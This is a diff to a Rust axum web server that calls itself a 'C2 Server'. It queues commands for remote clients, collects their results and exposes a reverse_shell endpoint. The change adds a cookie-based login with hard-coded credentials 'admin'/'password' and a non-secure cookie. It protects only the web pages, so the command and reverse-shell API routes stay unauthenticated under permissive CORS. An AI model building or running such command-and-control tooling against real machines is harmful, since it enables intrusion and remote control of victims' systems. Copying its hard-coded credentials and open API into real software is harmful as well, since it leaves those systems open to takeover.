@@ -1,11 +1,12 @@
 use askama::Template;
 use axum::{
     Json, Router,
-    extract::{Path, State},
+    extract::{Path, State, Form, Request},
     http::StatusCode,
-    response::Html,
+    response::{Html, IntoResponse, Response},
     routing::{get, post},
     serve,
+    middleware::Next,
 };
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
@@ -14,6 +15,8 @@ use tokio::net::TcpListener;
 use tokio::sync::RwLock;
 use tower_http::cors::CorsLayer;
 use tower_http::services::ServeDir;
+use tower_cookies::{CookieManagerLayer, Cookies, Cookie};
+use rand::Rng;
 
 // 引入common模块
 use common::*;
@@ -25,12 +28,7 @@ pub struct ServerState {
     pub commands: Arc<RwLock<HashMap<String, Vec<CommandRequest>>>>,
     pub command_results: Arc<RwLock<HashMap<String, Vec<CommandResponse>>>>,
     pub shell_sessions: Arc<RwLock<HashMap<String, ShellSession>>>,
-}
-
-impl Default for ServerState {
-    fn default() -> Self {
-        Self::new()
-    }
+    pub session_tokens: Arc<RwLock<HashMap<String, chrono::DateTime<chrono::Utc>>>>,
 }
 
 impl ServerState {
@@ -40,8 +38,22 @@ impl ServerState {
             commands: Arc::new(RwLock::new(HashMap::new())),
             command_results: Arc::new(RwLock::new(HashMap::new())),
             shell_sessions: Arc::new(RwLock::new(HashMap::new())),
+            session_tokens: Arc::new(RwLock::new(HashMap::new())),
         }
     }
+}
+
+/// 生成32位随机字母数字字符串
+fn generate_session_token() -> String {
+    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let mut rng = rand::thread_rng();
+    
+    (0..32)
+        .map(|_| {
+            let idx = rng.gen_range(0..CHARSET.len());
+            CHARSET[idx] as char
+        })
+        .collect()
 }
 
 /// Web模板
@@ -66,6 +78,16 @@ pub struct DisplayClientInfo {
 struct ClientTemplate {
     client: ClientInfo,
     commands: Vec<CommandResponse>,
+}
+
+#[derive(Template)]
+#[template(path = "login.html")]
+struct LoginTemplate {}
+
+#[derive(Debug, Deserialize)]
+struct Credentials {
+    username: String,
+    password: String,
 }
 
 /// API处理器
@@ -278,16 +300,85 @@ async fn initiate_reverse_shell(
     Ok(StatusCode::OK)
 }
 
+async fn login_get() -> Html<String> {
+    let template = LoginTemplate {};
+    Html(template.render().unwrap())
+}
+
+// FIXED: Correct parameter order for axum 0.8.4
+async fn login_post(
+    State(state): State<ServerState>,
+    cookies: Cookies,
+    Form(credentials): Form<Credentials>,
+) -> impl IntoResponse {
+    const USERNAME: &str = "admin";
+    const PASSWORD: &str = "password";
+
+    if credentials.username == USERNAME && credentials.password == PASSWORD {
+        // 生成32位随机session token
+        let session_token = generate_session_token();
+        let expires_at = chrono::Utc::now() + chrono::Duration::hours(24); // 24小时有效期
+        
+        // 存储session token
+        {
+            let mut tokens = state.session_tokens.write().await;
+            tokens.insert(session_token.clone(), expires_at);
+        }
+        
+        // 设置cookie
+        let mut cookie = Cookie::new("session_token", session_token);
+        cookie.set_max_age(Some(tower_cookies::cookie::time::Duration::hours(24)));
+        cookie.set_http_only(true);
+        cookie.set_secure(false); // 在生产环境中应该设置为true
+        cookie.set_same_site(tower_cookies::cookie::SameSite::Lax);
+        
+        cookies.add(cookie);
+        axum::response::Redirect::to("/").into_response()
+    } else {
+        axum::response::Redirect::to("/login").into_response()
+    }
+}
+
+// FIXED: Correct parameter order for middleware in axum 0.8.4
+async fn auth_middleware(
+    State(state): State<ServerState>,
+    cookies: Cookies,
+    request: Request,
+    next: Next,
+) -> Response {
+    if let Some(cookie) = cookies.get("session_token") {
+        let token = cookie.value();
+        let mut tokens = state.session_tokens.write().await;
+        
+        if let Some(expires_at) = tokens.get(token) {
+            if chrono::Utc::now() < *expires_at {
+                // Token有效，继续处理请求
+                return next.run(request).await;
+            } else {
+                // Token过期，删除它
+                tokens.remove(token);
+            }
+        }
+    }
+    
+    axum::response::Redirect::to("/login").into_response()
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let state = ServerState::new();
 
-    // 创建路由
-    let app = Router::new()
-        // Web界面路由
+    // Routes that require authentication
+    let protected_routes = Router::new()
         .route("/", get(index))
         .route("/client/{id}", get(client_detail))
-        // API路由
+        .route_layer(axum::middleware::from_fn_with_state(
+            state.clone(),
+            auth_middleware,
+        ));
+
+    // API routes (unprotected or with their own auth)
+    let api_routes = Router::new()
         .route("/api/register", post(register_client))
         .route("/api/heartbeat", post(handle_heartbeat))
         .route("/api/commands/{client_id}", get(get_commands))
@@ -296,11 +387,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .route("/api/clients", get(api_clients))
         .route("/api/clients/{client_id}/commands", post(send_command))
         .route("/api/clients/{client_id}/results", get(api_command_results))
-        .route("/api/clients/{client_id}/reverse_shell", post(initiate_reverse_shell))
-        .with_state(state)
-        // 静态文件服务
+        .route("/api/clients/{client_id}/reverse_shell", post(initiate_reverse_shell));
+
+    // Main application router
+    let app = Router::new()
+        .route("/login", get(login_get).post(login_post))
+        .merge(protected_routes)
+        .merge(api_routes)
+        // Static files
         .nest_service("/static", ServeDir::new("web/static"))
-        .layer(CorsLayer::permissive());
+        .layer(CorsLayer::permissive())
+        .layer(CookieManagerLayer::new())
+        .with_state(state);
 
     println!("C2 Server starting on http://0.0.0.0:8080");
 
